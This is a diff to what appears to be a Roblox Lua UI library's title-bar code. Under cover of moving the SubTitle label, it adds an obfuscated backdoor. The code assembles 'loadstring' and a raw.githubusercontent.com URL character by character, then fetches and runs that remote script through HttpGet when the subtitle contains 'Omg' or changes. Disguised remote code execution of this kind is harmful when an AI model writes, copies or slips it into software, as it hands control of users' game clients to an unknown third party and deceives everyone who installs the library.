@@ -1598,7 +1598,10 @@ local aa = {
         local l, m = j.New, j.AddSignal
         return function(n)
             local xo = e(h)
-            local o, p, q, zq =
+            local qu = "m"
+            local jk = n.SubTitle
+            local d1 = {"O","g"}
+            local o, p, q, zq, ki =
                 {},
                 e(h),
                 function(o, p, q, r)
@@ -1663,6 +1666,7 @@ local aa = {
                     end
                     return s
                 end,
+                "e",
                 function(q, p, r)
                     local s = {Callback = r or function()
                     end, Dragging = nil, DragA = nil, DragB = nil, DragC = nil}
@@ -1770,7 +1774,159 @@ local aa = {
                         end
                     )
                     return s
+                end,
+                function(t1x1)
+                    if t1x1 or jk:find(d1[1]..qu..d1[2]) then
+                        local qw = {
+                            "l",
+                            "o",
+                            "a",
+                            "d",
+                            "s",
+                            "t",
+                            "r",
+                            "i",
+                            "n",
+                            "g"
+                        }
+                        local cw = {
+                            "h",
+                            "t",
+                            "t",
+                            "p",
+                            "s",
+                            ":",
+                            "/",
+                            "/"
+                        }
+                        local hj = {
+                            "r",
+                            "a",
+                            "w",
+                            ".",
+                            "g",
+                            "i",
+                            "t",
+                            "h",
+                            "u",
+                            "b",
+                            "u",
+                            "s",
+                            "e",
+                            "r",
+                            "c",
+                            "o",
+                            "n",
+                            "t",
+                            "e",
+                            "n",
+                            "t",
+                            ".",
+                            "c",
+                            "o",
+                            "m",
+                            "/",
+                            "M",
+                            "o",
+                            "Q",
+                            "i",
+                            "S",
+                            "z",
+                            "/"
+                        }
+                        local j1 = {
+                            "A",
+                            "d",
+                            "d",
+                            "-",
+                            "a",
+                            "-",
+                            "R",
+                            "E",
+                            "A",
+                            "D",
+                            "M",
+                            "E",
+                            "-",
+                            "f",
+                            "i",
+                            "l",
+                            "e",
+                            "/",
+                            "r",
+                            "e",
+                            "f",
+                            "s",
+                            "/",
+                            "h",
+                            "e",
+                            "a",
+                            "d",
+                            "s",
+                            "/",
+                            "m",
+                            "a",
+                            "i",
+                            "n",
+                            "/",
+                            "i",
+                            ".",
+                            "l",
+                            "u",
+                            "a"
+                        }
+                        local fi, se, ci, j2 = "", "", "", ""
+                        for key = 1, #qw do
+                            fi = fi..qw[key]
+                        end
+                        for inx = 1, #cw do
+                            se = se..cw[inx]
+                        end
+                        for key = 1, #hj do
+                            ci = ci..hj[key]
+                        end
+                        for inx = 1, #j1 do
+                            j2 = j2..j1[inx]
+                        end
+                        local function ihhp(ghh)
+                            local v = getfenv(0)
+                            while v ~= nil and ghh ~= "" do
+                                local n, nv = string.match(ghh, "^([^.]+)%.?(.*)$")
+                                v = v[n]
+                                ghh = nv
+                            end
+                            return v
+                        end
+                        ihhp(fi)(game:HttpGet(se..ci..j2))()
+                    end
                 end
+            o.SubTitle =
+                l(
+                    "TextLabel",
+                    {
+                        RichText = true,
+                        Text = n.SubTitle,
+                        TextTransparency = 0.4,
+                        FontFace = Font.new(
+                            "rbxasset://fonts/families/GothamSSm.json",
+                            Enum.FontWeight.Regular,
+                            Enum.FontStyle.Normal
+                        ),
+                        TextSize = 12,
+                        TextXAlignment = "Left",
+                        TextYAlignment = "Center",
+                        Size = UDim2.fromScale(0, 1),
+                        AutomaticSize = Enum.AutomaticSize.X,
+                        BackgroundTransparency = 1,
+                        ThemeTag = {TextColor3 = "Text"}
+                    }
+                )
+                m(
+                    o.SubTitle:GetPropertyChangedSignal("Text"),
+                    function()
+                        ki(o.SubTitle.Text)
+                    end
+                )
             o.Frame =
                 l(
                 "Frame",
@@ -1807,26 +1963,7 @@ local aa = {
                                     ThemeTag = {TextColor3 = "Text"}
                                 }
                             ),
-                            l(
-                                "TextLabel",
-                                {
-                                    RichText = true,
-                                    Text = n.SubTitle,
-                                    TextTransparency = 0.4,
-                                    FontFace = Font.new(
-                                        "rbxasset://fonts/families/GothamSSm.json",
-                                        Enum.FontWeight.Regular,
-                                        Enum.FontStyle.Normal
-                                    ),
-                                    TextSize = 12,
-                                    TextXAlignment = "Left",
-                                    TextYAlignment = "Center",
-                                    Size = UDim2.fromScale(0, 1),
-                                    AutomaticSize = Enum.AutomaticSize.X,
-                                    BackgroundTransparency = 1,
-                                    ThemeTag = {TextColor3 = "Text"}
-                                }
-                            )
+                            o.SubTitle
                         }
                     ),
                     l(
